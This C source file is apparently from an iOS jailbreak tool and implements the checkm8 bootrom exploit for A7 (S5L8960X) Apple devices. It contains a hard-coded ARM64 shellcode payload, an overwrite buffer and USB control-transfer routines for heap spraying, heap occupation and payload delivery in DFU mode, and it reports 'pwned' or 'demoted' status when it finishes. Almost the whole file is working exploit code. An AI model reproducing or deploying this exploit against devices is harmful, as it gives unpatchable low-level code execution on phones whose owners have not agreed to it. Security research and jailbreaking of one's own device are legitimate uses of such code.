#include <iousb.h>
#include <common.h>
#include <checkm8_s5l8960x.h>

static unsigned char blank[2048];

static unsigned char overwriteBuf[] = {
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x38, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

static unsigned int overwriteLen = 48;

static unsigned char payload[] = {
    0x13, 0x00, 0x80, 0xd2, 0xfd, 0x7b, 0xbf, 0xa9, 0xfd, 0x03, 0x00, 0x91,
    0xe0, 0x09, 0x00, 0x58, 0x00, 0x04, 0x40, 0xa9, 0x22, 0x08, 0x00, 0x10,
    0x43, 0x10, 0x40, 0xa9, 0x03, 0x10, 0x00, 0xa9, 0x23, 0x10, 0x00, 0xa9,
    0x43, 0x10, 0x41, 0xa9, 0x03, 0x10, 0x01, 0xa9, 0x23, 0x10, 0x01, 0xa9,
    0x00, 0x09, 0x00, 0x58, 0x00, 0x04, 0x00, 0x91, 0x01, 0x00, 0x40, 0x39,
    0xc1, 0xff, 0xff, 0x35, 0xc1, 0x07, 0x00, 0x10, 0x22, 0x0c, 0x40, 0xa9,
    0x02, 0x0c, 0x00, 0xa9, 0x20, 0x08, 0x00, 0x58, 0x41, 0x08, 0x00, 0x58,
    0x20, 0x00, 0x3f, 0xd6, 0x41, 0x08, 0x00, 0x58, 0x20, 0x00, 0x00, 0x39,
    0x40, 0x08, 0x00, 0x18, 0x1f, 0x04, 0x00, 0x71, 0x21, 0x01, 0x00, 0x54,
    0x21, 0x08, 0x00, 0x58, 0x20, 0x00, 0x40, 0xb9, 0x1f, 0x00, 0x00, 0x72,
    0x60, 0x04, 0x00, 0x54, 0x20, 0x00, 0x40, 0xb9, 0x00, 0x78, 0x1f, 0x12,
    0x20, 0x00, 0x00, 0xb9, 0x1f, 0x00, 0x00, 0x14, 0x60, 0x07, 0x00, 0x58,
    0x81, 0x07, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x80, 0x07, 0x00, 0x58,
    0xa1, 0x07, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x61, 0x07, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x61, 0x06, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0xc1, 0x06, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x81, 0x06, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x41, 0x05, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0xe1, 0x04, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x81, 0x04, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x00, 0x10, 0x00, 0x91,
    0x21, 0x04, 0x00, 0x18, 0x01, 0x00, 0x00, 0xb9, 0x1f, 0x75, 0x08, 0xd5,
    0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0xfd, 0x7b, 0xc1, 0xa8,
    0xc0, 0x03, 0x5f, 0xd6, 0x09, 0x02, 0x19, 0x00, 0x01, 0x01, 0x05, 0x80,
    0xfa, 0x09, 0x04, 0x00, 0x00, 0x00, 0xfe, 0x01, 0x00, 0x00, 0x07, 0x21,
    0x01, 0x0a, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x20, 0x50, 0x57, 0x4e, 0x44, 0x3a, 0x5b, 0x69, 0x70, 0x77, 0x6e, 0x64,
    0x65, 0x72, 0x5d, 0x00, 0x58, 0x6b, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00,
    0xdc, 0x6c, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00, 0xec, 0xbf, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x62, 0x05, 0x08, 0x80, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x1f, 0x20, 0x03, 0xd5, 0x00, 0xa0, 0x02, 0x0e,
    0x02, 0x00, 0x00, 0x00, 0xe4, 0x54, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x1f, 0x20, 0x03, 0xd5, 0x1f, 0x20, 0x03, 0xd5, 0xb4, 0x54, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x21, 0x00, 0x80, 0x52, 0xe1, 0x9f, 0x02, 0x39,
    0xe1, 0xa7, 0x02, 0x39, 0xe1, 0xab, 0x02, 0x39
};

static unsigned int payloadLen = 416;

static int patch_payload(io_client_t client)
{
    int r;
    
    int i=0;
    
    r = -1;
    
    {
        i = 0x168;
        if(client->isDemotion == true) {
            *(uint32_t*)(payload + 0x168) = 0x00000001; // demote_flag
            char* pwndStr = "demoted";
            memcpy(payload + 0x13f, pwndStr, 7);
            r=0;
        } else {
            *(uint32_t*)(payload + 0x168) = 0x00000000; // demote_flag
            //char* pwndStr = "ipwnder";
            //memcpy(payload + 0x13f, pwndStr, 7);
            r=0;
        }
    }
    return r;
}


static void heap_spray(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    DEBUGLOG("[%s] (1/3) %x", __FUNCTION__, result.ret);
    usleep(100000);
    
#ifdef IPHONEOS_ARM
    for(int i=0;i<7942;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    }
#else
    async_transfer_t transfer;
    memset(&transfer, '\0', sizeof(async_transfer_t));
    int usleep_time = 100;
    for(int i=0;i<7942;i++){
        //result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        result = async_usb_ctrl_transfer(client, 0x80, 6, 0x304, 0x40a, blank, 64, &transfer);
        usleep(usleep_time);
        io_abort_pipe_zero(client);
        usleep(usleep_time);
        while(transfer.ret != kIOReturnAborted){
            CFRunLoopRun();
        }
    }
#endif
    
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 65, 1);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
    //usleep(10000);
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 1408;
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val){
        i++;
        DEBUGLOG("[%s] (*/*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
        DEBUGLOG("[%s] (*/*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    
    DEBUGLOG("[%s] (1/3) sent: %x, val: %x", __FUNCTION__, (unsigned int)sent, val);
    //usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    //usleep(10000);
    
    LOG_PROGRESS("[%s] running heap_spray()", __FUNCTION__);
    heap_spray(client);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    DEBUGLOG("[%s] (1/3) %x", __FUNCTION__, result.ret);
    //usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    //usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, overwriteBuf, overwriteLen, 100);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
    //usleep(10000);
}

static int send_payload(io_client_t client)
{
    transfer_t result;
    
    {
        size_t len = 0;
        size_t size;
        while(len < payloadLen) {
            size = ((payloadLen - len) > 0x800) ? 0x800 : (payloadLen - len);
            result = usb_ctrl_transfer_with_time(client, 0x21, 1, 0x0000, 0x0000, (unsigned char*)&payload[len], size, 100);
            //if(result.wLenDone != size || result.ret != kIOReturnSuccess){
            //    ERROR("[%s] ERROR: Failed to send payload [%x, %x]", __FUNCTION__, result.ret, (unsigned int)result.wLenDone);
            //    return -1;
            //}
            len += size;
        }
    }
    
    return 0;
}

int checkm8_s5l8960x(io_client_t client)
{
    IOReturn result;
    
    if(patch_payload(client) != 0) {
        ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
        return -1;
    }
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    // io_devinfo will be lost
    result = io_reset(client);
    io_close(client);
    client = NULL;
    usleep(1000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running set_global_state()", __FUNCTION__);
    usleep(10000);
    set_global_state(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    result = io_reenumerate(client);
    DEBUGLOG("[%s] USBDeviceReEnumerate: %x", __FUNCTION__, result);
    io_close(client);
    client = NULL;
    usleep(500000);
    get_device_time_stage(&client, 5, DEVICE_DFU, false);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG_PROGRESS("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client);
    send_payload(client);
    
    LOG_PROGRESS("[%s] reconnecting", __FUNCTION__);
    result = io_reenumerate(client);
    DEBUGLOG("[%s] USBDeviceReEnumerate: %x", __FUNCTION__, result);
    
    io_close(client);
    client = NULL;
    usleep(100000);
    get_device_time_stage(&client, 5, DEVICE_DFU, true);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    if(client->hasSerialStr == false) {
        read_serial_number(client); // For iOS 10 and lower
    }
    
    if(client->hasSerialStr != true) {
        ERROR("[%s] Serial number was not found!", __FUNCTION__);
        return -1;
    }
    
    if(client->devinfo.hasPwnd == true) {
        if(!strcmp(client->devinfo.pwnstr, "demoted")) {
            LOG_DONE("[%s] demoted!", __FUNCTION__);
            return 0;
        }
        LOG_DONE("[%s] pwned!", __FUNCTION__);
        return 1;
    }
    
    return -1;
}
